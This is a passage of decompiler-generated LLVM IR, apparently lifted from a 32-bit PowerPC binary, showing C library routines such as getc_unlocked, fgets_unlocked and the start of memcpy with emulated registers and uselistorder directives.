  %v1_1000ef20 = call i32 @__asm_rlwinm(i32 %v3_1000ef14, i32 0, i32 26, i32 24)
  %v2_1000ef20 = trunc i32 %v1_1000ef20 to i16
  store i32 %v1_1000ef20, i32* %r0.global-to-local, align 4
  %v3_1000ef24 = load i32, i32* @r31, align 4
  %v4_1000ef24 = inttoptr i32 %v3_1000ef24 to i16*
  store i16 %v2_1000ef20, i16* %v4_1000ef24, align 2
  %v0_1000ef28 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ef28 = load i32, i32* @r31, align 4
  %v2_1000ef28 = add i32 %v1_1000ef28, 28
  %v3_1000ef28 = inttoptr i32 %v2_1000ef28 to i32*
  store i32 %v0_1000ef28, i32* %v3_1000ef28, align 4
  br label %dec_label_pc_1000ef2c

dec_label_pc_1000ef2c:                            ; preds = %dec_label_pc_1000ef04, %dec_label_pc_1000eef4, %dec_label_pc_1000eeec, %dec_label_pc_1000ef14
  store i32 %v0_1000ec60, i32* %r0.global-to-local, align 4
  %v0_1000ef30 = load i32, i32* @r30, align 4
  ret i32 %v0_1000ef30

; uselistorder directives
  uselistorder i32 %v1_1000ef20, { 1, 0 }
  uselistorder i32 %v3_1000eee0, { 1, 2, 0 }
  uselistorder i32 %v1_1000ee7c, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25 }
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32* @global_var_100212d4.538, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* bitcast (i32** @global_var_100211d0.540 to i32*), { 1, 2, 3, 0, 4, 5, 6, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_100212d0.536 to i32), { 0, 1, 4, 5, 2, 3, 6 }
  uselistorder i32 221, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8 }
  uselistorder i32* @global_var_100212e0.565, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* @global_var_10021244.564, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ()* @__lll_lock_wait_private, { 11, 10, 9, 1, 0, 8, 7, 6, 5, 4, 3, 2, 12 }
  uselistorder i32 ptrtoint (i32* @global_var_100212dc.562 to i32), { 0, 6, 1, 2, 3, 7, 8, 4, 5, 9 }
  uselistorder i32 -29808, { 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 4, 29, 30, 13, 12, 28, 26, 5, 0, 10, 11, 3, 6, 2, 7, 8, 1, 9, 31 }
  uselistorder i16* %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000ef2c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000eee0, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000ee88, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000ee48, { 1, 0 }
  uselistorder label %dec_label_pc_1000ee3c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ede4, { 1, 0 }
  uselistorder label %dec_label_pc_1000edd4, { 1, 0 }
  uselistorder label %dec_label_pc_1000ed84, { 1, 0 }
  uselistorder label %dec_label_pc_1000ed80, { 1, 0 }
  uselistorder label %dec_label_pc_1000ed38, { 1, 0 }
  uselistorder label %dec_label_pc_1000ece0, { 1, 0 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i8, align 1
  %v0_1000ef44 = load i32, i32* @lr, align 4
  store i32 %v0_1000ef44, i32* %r0.global-to-local, align 4
  %v0_1000ef4c = load i32, i32* @r31, align 4
  %v0_1000ef50 = load i32, i32* @r3, align 4
  store i32 %v0_1000ef50, i32* @r31, align 4
  %v1_1000ef58 = add i32 %v0_1000ef50, 16
  %v2_1000ef58 = inttoptr i32 %v1_1000ef58 to i32*
  %v3_1000ef58 = load i32, i32* %v2_1000ef58, align 4
  store i32 %v3_1000ef58, i32* @r9, align 4
  %v1_1000ef5c = add i32 %v0_1000ef50, 24
  %v2_1000ef5c = inttoptr i32 %v1_1000ef5c to i32*
  %v3_1000ef5c = load i32, i32* %v2_1000ef5c, align 4
  store i32 %v3_1000ef5c, i32* %r0.global-to-local, align 4
  %v2_1000ef60 = icmp ult i32 %v3_1000ef58, %v3_1000ef5c
  br i1 %v2_1000ef60, label %dec_label_pc_1000efc8, label %dec_label_pc_1000ef68

dec_label_pc_1000ef68:                            ; preds = %entry
  %v1_1000ef68 = inttoptr i32 %v0_1000ef50 to i16*
  %v2_1000ef68 = load i16, i16* %v1_1000ef68, align 2
  %v3_1000ef68 = zext i16 %v2_1000ef68 to i32
  %v1_1000ef6c = and i32 %v3_1000ef68, 131
  store i32 %v1_1000ef6c, i32* %r0.global-to-local, align 4
  %v2_1000ef70 = icmp ugt i32 %v1_1000ef6c, 128
  br i1 %v2_1000ef70, label %dec_label_pc_1000ef88, label %dec_label_pc_1000ef78

dec_label_pc_1000ef78:                            ; preds = %dec_label_pc_1000ef68
  store i32 268496768, i32* @lr, align 4
  %v3_1000ef7c = call i32 @__stdio_trans2r_o(i16* inttoptr (i32 128 to i16*), i32 %v3_1000ef58)
  store i32 %v3_1000ef7c, i32* %r3.global-to-local, align 4
  %v3_1000ef80 = icmp eq i32 %v3_1000ef7c, 0
  br i1 %v3_1000ef80, label %dec_label_pc_1000ef78.dec_label_pc_1000ef88_crit_edge, label %dec_label_pc_1000f064

dec_label_pc_1000ef78.dec_label_pc_1000ef88_crit_edge: ; preds = %dec_label_pc_1000ef78
  %v0_1000ef88.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000ef88

dec_label_pc_1000ef88:                            ; preds = %dec_label_pc_1000ef78.dec_label_pc_1000ef88_crit_edge, %dec_label_pc_1000ef68
  %v2_1000efe8 = phi i32 [ %v0_1000ef88.pre, %dec_label_pc_1000ef78.dec_label_pc_1000ef88_crit_edge ], [ %v0_1000ef50, %dec_label_pc_1000ef68 ]
  %v1_1000ef88 = inttoptr i32 %v2_1000efe8 to i16*
  %v2_1000ef88 = load i16, i16* %v1_1000ef88, align 2
  %v3_1000ef88 = zext i16 %v2_1000ef88 to i32
  store i32 %v3_1000ef88, i32* @r11, align 4
  %v1_1000ef8c = and i32 %v3_1000ef88, 2
  store i32 %v1_1000ef8c, i32* %r0.global-to-local, align 4
  %v3_1000ef8c = icmp eq i32 %v1_1000ef8c, 0
  store i1 %v3_1000ef8c, i1* @cr0_eq, align 1
  br i1 %v3_1000ef8c, label %dec_label_pc_1000efb8, label %dec_label_pc_1000ef94

dec_label_pc_1000ef94:                            ; preds = %dec_label_pc_1000ef88
  %v1_1000ef94 = call i32 @__asm_rlwinm(i32 %v3_1000ef88, i32 2, i32 29, i32 29)
  %v1_1000ef98 = load i32, i32* @r31, align 4
  %v2_1000ef98 = add i32 %v1_1000ef98, %v1_1000ef94
  %v1_1000ef9c = add i32 %v2_1000ef98, 39
  %v2_1000ef9c = inttoptr i32 %v1_1000ef9c to i8*
  %v3_1000ef9c = load i8, i8* %v2_1000ef9c, align 1
  %v4_1000ef9c = zext i8 %v3_1000ef9c to i32
  store i32 %v4_1000ef9c, i32* %r0.global-to-local, align 4
  %v1_1000efa0 = add nsw i32 %v3_1000ef88, -1
  store i32 %v1_1000efa0, i32* @r9, align 4
  %v1_1000efa4 = trunc i32 %v1_1000efa0 to i16
  %v3_1000efa4 = inttoptr i32 %v1_1000ef98 to i16*
  store i16 %v1_1000efa4, i16* %v3_1000efa4, align 2
  %v0_1000efa8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1000efa8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000efb0 = load i32, i32* @r31, align 4
  %v2_1000efb0 = add i32 %v1_1000efb0, 40
  %v3_1000efb0 = inttoptr i32 %v2_1000efb0 to i32*
  store i32 0, i32* %v3_1000efb0, align 4
  br label %dec_label_pc_1000f068

dec_label_pc_1000efb8:                            ; preds = %dec_label_pc_1000ef88
  %v1_1000efb8 = add i32 %v2_1000efe8, 16
  %v2_1000efb8 = inttoptr i32 %v1_1000efb8 to i32*
  %v3_1000efb8 = load i32, i32* %v2_1000efb8, align 4
  store i32 %v3_1000efb8, i32* @r9, align 4
  %v1_1000efbc = add i32 %v2_1000efe8, 20
  %v2_1000efbc = inttoptr i32 %v1_1000efbc to i32*
  %v3_1000efbc = load i32, i32* %v2_1000efbc, align 4
  store i32 %v3_1000efbc, i32* %r0.global-to-local, align 4
  %v4_1000efc0 = icmp eq i32 %v3_1000efbc, %v3_1000efb8
  br i1 %v4_1000efc0, label %dec_label_pc_1000efd4, label %dec_label_pc_1000efc8

dec_label_pc_1000efc8:                            ; preds = %dec_label_pc_1000efb8, %entry
  %v1_1000f03c7 = phi i32 [ %v2_1000efe8, %dec_label_pc_1000efb8 ], [ %v0_1000ef50, %entry ]
  %v0_1000efc8 = phi i32 [ %v3_1000efb8, %dec_label_pc_1000efb8 ], [ %v3_1000ef58, %entry ]
  %v1_1000efc8 = inttoptr i32 %v0_1000efc8 to i8*
  %v2_1000efc8 = load i8, i8* %v1_1000efc8, align 1
  %v3_1000efc8 = zext i8 %v2_1000efc8 to i32
  store i32 %v3_1000efc8, i32* %r3.global-to-local, align 4
  %v1_1000efcc = add i32 %v0_1000efc8, 1
  store i32 %v1_1000efcc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000f03c

dec_label_pc_1000efd4:                            ; preds = %dec_label_pc_1000efb8
  %v1_1000efd4 = add i32 %v2_1000efe8, 4
  %v2_1000efd4 = inttoptr i32 %v1_1000efd4 to i32*
  %v3_1000efd4 = load i32, i32* %v2_1000efd4, align 4
  store i32 %v3_1000efd4, i32* %r0.global-to-local, align 4
  %v3_1000efd8 = icmp eq i32 %v3_1000efd4, -2
  br i1 %v3_1000efd8, label %dec_label_pc_1000efe0, label %dec_label_pc_1000eff0

dec_label_pc_1000efe0:                            ; preds = %dec_label_pc_1000efd4
  %v1_1000efe0 = or i32 %v3_1000ef88, 4
  store i32 %v1_1000efe0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1000efe8 = trunc i32 %v1_1000efe0 to i16
  store i16 %v1_1000efe8, i16* %v1_1000ef88, align 2
  br label %dec_label_pc_1000f068

dec_label_pc_1000eff0:                            ; preds = %dec_label_pc_1000efd4
  %v1_1000eff0 = and i32 %v3_1000ef88, 768
  store i32 %v1_1000eff0, i32* %r0.global-to-local, align 4
  %v3_1000eff0 = icmp eq i32 %v1_1000eff0, 0
  store i1 %v3_1000eff0, i1* @cr0_eq, align 1
  br i1 %v3_1000eff0, label %dec_label_pc_1000f004, label %dec_label_pc_1000eff8

dec_label_pc_1000eff8:                            ; preds = %dec_label_pc_1000eff0
  store i32 ptrtoint (i32** @global_var_100211d0.540 to i32), i32* %r3.global-to-local, align 4
  store i32 268496900, i32* @lr, align 4
  %v4_1000f000 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_100211d0.540 to i16*), i32 %v3_1000efb8)
  store i32 %v4_1000f000, i32* %r3.global-to-local, align 4
  %v0_1000f004.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000f004

dec_label_pc_1000f004:                            ; preds = %dec_label_pc_1000eff0, %dec_label_pc_1000eff8
  %v0_1000f044 = phi i32 [ %v2_1000efe8, %dec_label_pc_1000eff0 ], [ %v0_1000f004.pre, %dec_label_pc_1000eff8 ]
  %v1_1000f004 = add i32 %v0_1000f044, 8
  %v2_1000f004 = inttoptr i32 %v1_1000f004 to i32*
  %v3_1000f004 = load i32, i32* %v2_1000f004, align 4
  %v1_1000f008 = add i32 %v0_1000f044, 12
  %v2_1000f008 = inttoptr i32 %v1_1000f008 to i32*
  %v3_1000f008 = load i32, i32* %v2_1000f008, align 4
  store i32 %v3_1000f008, i32* %r0.global-to-local, align 4
  %v4_1000f00c = icmp eq i32 %v3_1000f008, %v3_1000f004
  br i1 %v4_1000f00c, label %dec_label_pc_1000f044, label %dec_label_pc_1000f014

dec_label_pc_1000f014:                            ; preds = %dec_label_pc_1000f004
  %v2_1000f014 = add i32 %v0_1000f044, 24
  %v3_1000f014 = inttoptr i32 %v2_1000f014 to i32*
  store i32 %v3_1000f004, i32* %v3_1000f014, align 4
  %v0_1000f018 = load i32, i32* @r31, align 4
  store i32 %v0_1000f018, i32* %r3.global-to-local, align 4
  store i32 268496928, i32* @lr, align 4
  %v2_1000f01c = call i32 @__stdio_rfill(i32 %v0_1000f018, i32 %v3_1000f004)
  store i32 %v2_1000f01c, i32* %r3.global-to-local, align 4
  %v3_1000f020 = icmp eq i32 %v2_1000f01c, 0
  br i1 %v3_1000f020, label %dec_label_pc_1000f064, label %dec_label_pc_1000f028

dec_label_pc_1000f028:                            ; preds = %dec_label_pc_1000f014
  %v0_1000f028 = load i32, i32* @r31, align 4
  %v1_1000f028 = add i32 %v0_1000f028, 20
  %v2_1000f028 = inttoptr i32 %v1_1000f028 to i32*
  %v3_1000f028 = load i32, i32* %v2_1000f028, align 4
  store i32 %v3_1000f028, i32* %r0.global-to-local, align 4
  %v1_1000f02c = add i32 %v0_1000f028, 16
  %v2_1000f02c = inttoptr i32 %v1_1000f02c to i32*
  %v3_1000f02c = load i32, i32* %v2_1000f02c, align 4
  store i32 %v3_1000f02c, i32* @r9, align 4
  %v2_1000f030 = add i32 %v0_1000f028, 24
  %v3_1000f030 = inttoptr i32 %v2_1000f030 to i32*
  store i32 %v3_1000f028, i32* %v3_1000f030, align 4
  %v0_1000f034 = load i32, i32* @r9, align 4
  %v1_1000f034 = add i32 %v0_1000f034, 1
  store i32 %v1_1000f034, i32* %r0.global-to-local, align 4
  %v1_1000f038 = inttoptr i32 %v0_1000f034 to i8*
  %v2_1000f038 = load i8, i8* %v1_1000f038, align 1
  %v3_1000f038 = zext i8 %v2_1000f038 to i32
  store i32 %v3_1000f038, i32* %r3.global-to-local, align 4
  %v1_1000f03c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000f03c

dec_label_pc_1000f03c:                            ; preds = %dec_label_pc_1000efc8, %dec_label_pc_1000f028
  %v1_1000f03c = phi i32 [ %v1_1000f03c7, %dec_label_pc_1000efc8 ], [ %v1_1000f03c.pre, %dec_label_pc_1000f028 ]
  %v0_1000f03c = phi i32 [ %v1_1000efcc, %dec_label_pc_1000efc8 ], [ %v1_1000f034, %dec_label_pc_1000f028 ]
  %v2_1000f03c = add i32 %v1_1000f03c, 16
  %v3_1000f03c = inttoptr i32 %v2_1000f03c to i32*
  store i32 %v0_1000f03c, i32* %v3_1000f03c, align 4
  br label %dec_label_pc_1000f068

dec_label_pc_1000f044:                            ; preds = %dec_label_pc_1000f004
  store i32 %v0_1000f044, i32* %r3.global-to-local, align 4
  %v2_1000f048 = ptrtoint i8* %stack_var_-24 to i32
  store i32 %v2_1000f048, i32* @r4, align 4
  store i32 268496980, i32* @lr, align 4
  %v3_1000f050 = inttoptr i32 %v0_1000f044 to i16*
  %v4_1000f050 = call i32 @__stdio_READ(i16* %v3_1000f050, i32 %v2_1000f048, i32 1)
  store i32 %v4_1000f050, i32* %r3.global-to-local, align 4
  %v3_1000f054 = icmp eq i32 %v4_1000f050, 0
  br i1 %v3_1000f054, label %dec_label_pc_1000f064, label %dec_label_pc_1000f05c

dec_label_pc_1000f05c:                            ; preds = %dec_label_pc_1000f044
  %v3_1000f05c = load i8, i8* %stack_var_-24, align 1
  %v4_1000f05c = sext i8 %v3_1000f05c to i32
  store i32 %v4_1000f05c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f068

dec_label_pc_1000f064:                            ; preds = %dec_label_pc_1000ef78, %dec_label_pc_1000f044, %dec_label_pc_1000f014
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f068

dec_label_pc_1000f068:                            ; preds = %dec_label_pc_1000f05c, %dec_label_pc_1000f03c, %dec_label_pc_1000efe0, %dec_label_pc_1000ef94, %dec_label_pc_1000f064
  store i32 %v0_1000ef44, i32* @r0, align 4
  store i32 %v0_1000ef4c, i32* @r31, align 4
  %v0_1000f078 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000f078

; uselistorder directives
  uselistorder i32 %v0_1000f044, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v0_1000efc8, { 1, 0 }
  uselistorder i32 %v3_1000efb8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000ef98, { 1, 0 }
  uselistorder i32 %v3_1000ef88, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 %v2_1000efe8, { 1, 2, 0, 4, 3, 5 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 13 }
  uselistorder i16* bitcast (i32** @global_var_100211d0.540 to i16*), { 1, 0 }
  uselistorder i16* @global_var_100210bc.523, { 2, 1, 0 }
  uselistorder i32 768, { 2, 1, 0 }
  uselistorder i32 39, { 8, 3, 4, 0, 5, 1, 6, 2, 7 }
  uselistorder i32 128, { 6, 12, 14, 15, 13, 9, 7, 10, 8, 11, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_1000f068, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000f064, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000f03c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f004, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000f080 = load i32, i32* @lr, align 4
  %v3_1000f088 = icmp eq i32 %arg2, 0
  store i1 %v3_1000f088, i1* @cr0_eq, align 1
  store i32 %tmp, i32* @r28, align 4
  store i32 %arg3, i32* @r30, align 4
  %tmp16 = icmp slt i32 %arg2, 1
  br i1 %tmp16, label %dec_label_pc_1000f124, label %dec_label_pc_1000f09c

dec_label_pc_1000f09c:                            ; preds = %entry
  store i32 %tmp, i32* @r31, align 4
  %v2_1000f1082 = add i32 %arg2, -1
  store i32 %v2_1000f1082, i32* @r29, align 4
  %v5_1000f1085 = icmp eq i32 %v2_1000f1082, 0
  store i1 %v5_1000f1085, i1* @cr0_eq, align 1
  %v4_1000f10c6 = icmp eq i32 %arg2, 1
  br i1 %v4_1000f10c6, label %dec_label_pc_1000f110, label %dec_label_pc_1000f0a4

dec_label_pc_1000f0a4:                            ; preds = %dec_label_pc_1000f09c, %dec_label_pc_1000f108.backedge.dec_label_pc_1000f0a4_crit_edge
  %v2_1000f0c0 = phi i32 [ %v2_1000f0c09, %dec_label_pc_1000f108.backedge.dec_label_pc_1000f0a4_crit_edge ], [ %tmp, %dec_label_pc_1000f09c ]
  %v0_1000f0d4 = phi i32 [ %v0_1000f0a4.pre, %dec_label_pc_1000f108.backedge.dec_label_pc_1000f0a4_crit_edge ], [ %arg3, %dec_label_pc_1000f09c ]
  %v1_1000f0a4 = add i32 %v0_1000f0d4, 16
  %v2_1000f0a4 = inttoptr i32 %v1_1000f0a4 to i32*
  %v3_1000f0a4 = load i32, i32* %v2_1000f0a4, align 4
  store i32 %v3_1000f0a4, i32* @r9, align 4
  %v1_1000f0a8 = add i32 %v0_1000f0d4, 24
  %v2_1000f0a8 = inttoptr i32 %v1_1000f0a8 to i32*
  %v3_1000f0a8 = load i32, i32* %v2_1000f0a8, align 4
  %v1_1000f0ac = add i32 %v3_1000f0a4, 1
  store i32 %v1_1000f0ac, i32* @r11, align 4
  %v2_1000f0b0 = icmp ult i32 %v3_1000f0a4, %v3_1000f0a8
  %v4_1000f0b0 = icmp eq i32 %v3_1000f0a4, %v3_1000f0a8
  store i1 %v4_1000f0b0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000f0b0, label %dec_label_pc_1000f0b8, label %dec_label_pc_1000f0d4

dec_label_pc_1000f0b8:                            ; preds = %dec_label_pc_1000f0a4
  %v1_1000f0b8 = inttoptr i32 %v3_1000f0a4 to i8*
  %v2_1000f0b8 = load i8, i8* %v1_1000f0b8, align 1
  %v3_1000f0bc = icmp eq i8 %v2_1000f0b8, 10
  store i1 %v3_1000f0bc, i1* %cr7_eq.global-to-local, align 1
  %v3_1000f0c0 = inttoptr i32 %v2_1000f0c0 to i8*
  store i8 %v2_1000f0b8, i8* %v3_1000f0c0, align 1
  %v0_1000f0c4 = load i32, i32* @r11, align 4
  %v1_1000f0c4 = load i32, i32* @r30, align 4
  %v2_1000f0c4 = add i32 %v1_1000f0c4, 16
  %v3_1000f0c4 = inttoptr i32 %v2_1000f0c4 to i32*
  store i32 %v0_1000f0c4, i32* %v3_1000f0c4, align 4
  %v0_1000f0c8 = load i32, i32* @r31, align 4
  %v1_1000f0c8 = add i32 %v0_1000f0c8, 1
  store i32 %v1_1000f0c8, i32* @r31, align 4
  %v0_1000f0cc = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000f0cc, label %dec_label_pc_1000f110, label %dec_label_pc_1000f108.backedge

dec_label_pc_1000f0d4:                            ; preds = %dec_label_pc_1000f0a4
  store i32 %v0_1000f0d4, i32* @r3, align 4
  store i32 268497116, i32* @lr, align 4
  %v0_1000f0d8 = call i32 @getc_unlocked()
  %v3_1000f0dc = icmp eq i32 %v0_1000f0d8, -1
  store i1 %v3_1000f0dc, i1* %cr7_eq.global-to-local, align 1
  %v1_1000f0e0 = urem i32 %v0_1000f0d8, 256
  %v3_1000f0e4 = icmp eq i32 %v1_1000f0e0, 10
  store i1 %v3_1000f0e4, i1* %cr6_eq.global-to-local, align 1
  br i1 %v3_1000f0dc, label %dec_label_pc_1000f0ec, label %dec_label_pc_1000f0fc

dec_label_pc_1000f0ec:                            ; preds = %dec_label_pc_1000f0d4
  %v0_1000f0ec = load i32, i32* @r30, align 4
  %v1_1000f0ec = inttoptr i32 %v0_1000f0ec to i16*
  %v2_1000f0ec = load i16, i16* %v1_1000f0ec, align 2
  %v3_1000f0ec = zext i16 %v2_1000f0ec to i32
  %v1_1000f0f0 = and i32 %v3_1000f0ec, 8
  store i32 %v1_1000f0f0, i32* @r9, align 4
  %v3_1000f0f0 = icmp eq i32 %v1_1000f0f0, 0
  store i1 %v3_1000f0f0, i1* @cr0_eq, align 1
  br i1 %v3_1000f0f0, label %dec_label_pc_1000f0ec.dec_label_pc_1000f110_crit_edge, label %dec_label_pc_1000f124

dec_label_pc_1000f0ec.dec_label_pc_1000f110_crit_edge: ; preds = %dec_label_pc_1000f0ec
  %v0_1000f110.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000f110

dec_label_pc_1000f0fc:                            ; preds = %dec_label_pc_1000f0d4
  %v1_1000f0fc = trunc i32 %v0_1000f0d8 to i8
  %v2_1000f0fc = load i32, i32* @r31, align 4
  %v3_1000f0fc = inttoptr i32 %v2_1000f0fc to i8*
  store i8 %v1_1000f0fc, i8* %v3_1000f0fc, align 1
  %v0_1000f100 = load i32, i32* @r31, align 4
  %v1_1000f100 = add i32 %v0_1000f100, 1
  store i32 %v1_1000f100, i32* @r31, align 4
  %v0_1000f104 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_1000f104, label %dec_label_pc_1000f110, label %dec_label_pc_1000f108.backedge

dec_label_pc_1000f108.backedge:                   ; preds = %dec_label_pc_1000f0fc, %dec_label_pc_1000f0b8
  %v2_1000f0c09 = phi i32 [ %v1_1000f100, %dec_label_pc_1000f0fc ], [ %v1_1000f0c8, %dec_label_pc_1000f0b8 ]
  %v0_1000f108 = load i32, i32* @r29, align 4
  %v2_1000f108 = add i32 %v0_1000f108, -1
  store i32 %v2_1000f108, i32* @r29, align 4
  %v5_1000f108 = icmp eq i32 %v2_1000f108, 0
  store i1 %v5_1000f108, i1* @cr0_eq, align 1
  %v4_1000f10c = icmp eq i32 %v0_1000f108, 1
  br i1 %v4_1000f10c, label %dec_label_pc_1000f110, label %dec_label_pc_1000f108.backedge.dec_label_pc_1000f0a4_crit_edge

dec_label_pc_1000f108.backedge.dec_label_pc_1000f0a4_crit_edge: ; preds = %dec_label_pc_1000f108.backedge
  %v0_1000f0a4.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000f0a4

dec_label_pc_1000f110:                            ; preds = %dec_label_pc_1000f0fc, %dec_label_pc_1000f108.backedge, %dec_label_pc_1000f0b8, %dec_label_pc_1000f09c, %dec_label_pc_1000f0ec.dec_label_pc_1000f110_crit_edge
  %v2_1000f11c = phi i32 [ %v0_1000f110.pre, %dec_label_pc_1000f0ec.dec_label_pc_1000f110_crit_edge ], [ %tmp, %dec_label_pc_1000f09c ], [ %v1_1000f0c8, %dec_label_pc_1000f0b8 ], [ %v2_1000f0c09, %dec_label_pc_1000f108.backedge ], [ %v1_1000f100, %dec_label_pc_1000f0fc ]
  %v1_1000f110 = load i32, i32* @r28, align 4
  %v3_1000f110 = icmp ugt i32 %v2_1000f11c, %v1_1000f110
  %v4_1000f110 = icmp eq i32 %v2_1000f11c, %v1_1000f110
  store i1 %v4_1000f110, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f110, label %dec_label_pc_1000f118, label %dec_label_pc_1000f124

dec_label_pc_1000f118:                            ; preds = %dec_label_pc_1000f110
  %v3_1000f11c = inttoptr i32 %v2_1000f11c to i8*
  store i8 0, i8* %v3_1000f11c, align 1
  %v0_1000f12c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000f128

dec_label_pc_1000f124:                            ; preds = %dec_label_pc_1000f0ec, %dec_label_pc_1000f110, %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000f128

dec_label_pc_1000f128:                            ; preds = %dec_label_pc_1000f118, %dec_label_pc_1000f124
  %v0_1000f12c = phi i32 [ %v0_1000f12c.pre, %dec_label_pc_1000f118 ], [ 0, %dec_label_pc_1000f124 ]
  store i32 %v0_1000f080, i32* @r0, align 4
  ret i32 %v0_1000f12c

; uselistorder directives
  uselistorder i32 %v2_1000f11c, { 0, 2, 1 }
  uselistorder i32 %v0_1000f0d8, { 1, 0, 2 }
  uselistorder i32 %v3_1000f0a8, { 1, 0 }
  uselistorder i32 %v3_1000f0a4, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_1000f0d4, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32 ()* @getc_unlocked, { 2, 1, 3, 0 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000f128, { 1, 0 }
  uselistorder label %dec_label_pc_1000f124, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000f110, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_1000f0a4, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1000f140 = load i32, i32* @r5, align 4
  %v1_1000f140 = call i32 @__asm_rlwinm.(i32 %v0_1000f140, i32 29, i32 3, i32 31)
  store i32 %v1_1000f140, i32* %r9.global-to-local, align 4
  %v4_1000f140 = icmp eq i32 %v1_1000f140, 0
  store i1 %v4_1000f140, i1* @cr0_eq, align 1
  %v0_1000f144 = load i32, i32* @r4, align 4
  %v1_1000f144 = add i32 %v0_1000f144, -4
  store i32 %v1_1000f144, i32* %r4.global-to-local, align 4
  %v0_1000f148 = load i32, i32* @r3, align 4
  %v1_1000f148 = add i32 %v0_1000f148, -4
  store i32 %v1_1000f148, i32* @r11, align 4
  br i1 %v4_1000f140, label %dec_label_pc_1000f170, label %dec_label_pc_1000f150

dec_label_pc_1000f150:                            ; preds = %entry
  %v1_1000f150 = urem i32 %v1_1000f148, 4
  %v3_1000f150 = icmp eq i32 %v1_1000f150, 0
  store i1 %v3_1000f150, i1* @cr0_eq, align 1
  br i1 %v3_1000f150, label %dec_label_pc_1000f158, label %dec_label_pc_1000f1ac

dec_label_pc_1000f158:                            ; preds = %dec_label_pc_1000f1cc.dec_label_pc_1000f158_crit_edge, %dec_label_pc_1000f150
  %v1_1000f164.pre = phi i32 [ %v1_1000f148, %dec_label_pc_1000f150 ], [ %v1_1000f164.pre.pre, %dec_label_pc_1000f1cc.dec_label_pc_1000f158_crit_edge ]
  %v0_1000f158 = phi i32 [ %v1_1000f140, %dec_label_pc_1000f150 ], [ %v1_1000f1cc, %dec_label_pc_1000f1cc.dec_label_pc_1000f158_crit_edge ]
  %.0 = phi i32 [ undef, %dec_label_pc_1000f150 ], [ %v2_1000f1b4, %dec_label_pc_1000f1cc.dec_label_pc_1000f158_crit_edge ]
  store i32 %v0_1000f158, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000f15c

dec_label_pc_1000f15c:                            ; preds = %dec_label_pc_1000f15c, %dec_label_pc_1000f158
  %v1_1000f164 = phi i32 [ %v2_1000f168, %dec_label_pc_1000f15c ], [ %v1_1000f164.pre, %dec_label_pc_1000f158 ]
  %v0_1000f15c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000f15c = add i32 %v0_1000f15c, 4
  %v2_1000f15c = inttoptr i32 %v1_1000f15c to i32*
  %v3_1000f15c = load i32, i32* %v2_1000f15c, align 4
  %v1_1000f160 = add i32 %v0_1000f15c, 8
